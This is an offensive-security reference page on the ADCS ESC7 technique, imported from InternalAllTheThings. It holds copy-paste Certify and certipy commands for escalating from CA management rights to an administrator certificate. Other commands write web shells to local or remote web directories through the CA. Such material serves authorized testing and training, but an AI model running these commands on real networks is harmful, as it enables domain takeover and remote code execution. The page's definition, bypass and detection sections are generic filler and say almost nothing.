---
title: Active Directory - Certificate ESC7
type: technique
tags: [active-directory, adcs, certificates, esc7, exploitation, reference-import, windows]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Active Directory - Certificate ESC7

## What it is

**Exploitation**.

## How it works

ESC7 exploits overly permissive ACEs on the CA object itself, specifically when a low-privileged user holds `ManageCA` or `Manage Certificates` rights. With `ManageCA`, the attacker can enable the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag on the CA to introduce an ESC6 condition, then request a certificate with an arbitrary SAN. Alternatively, `Manage Certificates` rights allow the attacker to approve pending certificate requests, bypassing the manager-approval requirement on restricted templates.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## ESC7 - Vulnerable Certificate Authority Access Control

**Exploitation**

* Detect CAs that allow low privileged users the `ManageCA`  or `Manage Certificates` permissions

```ps1
Certify.exe find /vulnerable
# or
certipy find -enabled -u user@domain.local -p password -dc-ip 10.10.10.10

# add "Manage Certificates" privilege
certipy ca -ca 'DOMAIN-CA' -username user@domain.local -p GoldCrown -add-officer user -dc-ip 10.10.10.10 -target-ip 10.10.10.11
```

* Change the CA settings to enable the SAN extension for all the templates under the vulnerable CA (ESC6)

```ps1
Certify.exe setconfig /enablesan /restart
```

* Request the certificate with the desired SAN.

```ps1
Certify.exe request /template:User /altname:super.adm
```

* Grant approval if required or disable the approval requirement

```ps1
# Grant
Certify.exe issue /id:[REQUEST ID]
# Disable
Certify.exe setconfig /removeapproval /restart
```

**Exploitation 2**:

Alternative exploitation from **ManageCA** to **RCE** on ADCS server:

```ps1
# Get the current CDP list. Useful to find remote writable shares:
Certify.exe writefile /ca:SERVER\ca-name /readonly

# Write an aspx shell to a local web directory:
Certify.exe writefile /ca:SERVER\ca-name /path:C:\Windows\SystemData\CES\CA-Name\shell.aspx /input:C:\Local\Path\shell.aspx

# Write the default asp shell to a local web directory:
Certify.exe writefile /ca:SERVER\ca-name /path:c:\inetpub\wwwroot\shell.asp

# Write a php shell to a remote web directory:
Certify.exe writefile /ca:SERVER\ca-name /path:\\remote.server\share\shell.php /input:C:\Local\path\shell.php
```

**Exploitation 3**:

```powershell
# enable SubCA template
certipy ca -ca 'DOMAIN-CA' -enable-template 'SubCA' -username user@domain.local -p password -dc-ip 10.10.10.10 -target-ip 10.10.10.11

# request a certificate based on subCA template
certipy req -ca 'DOMAIN-CA' -username user@domain.local -p password -dc-ip 10.10.10.10 -target-ip 10.10.10.11 -template SubCA -upn administrator@domain.local

# issue failed certificate request
certipy ca -ca 'DOMAIN-CA' -issue-request 7 -username user@domain.local -p password -dc-ip 10.10.10.10 -target-ip 10.10.10.11

# retrieve the issued certificate
certipy req -ca 'DOMAIN-CA' -username user@domain.local -p password -dc-ip 10.10.10.10 -target-ip 10.10.10.11 -retrieve 7
```

## References

* [AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022](https://www.blackarrow.net/adcs-weaponizing-esc7-attack/)
* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- [[certipy]]
- Also uses (no dedicated page yet): Certify

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
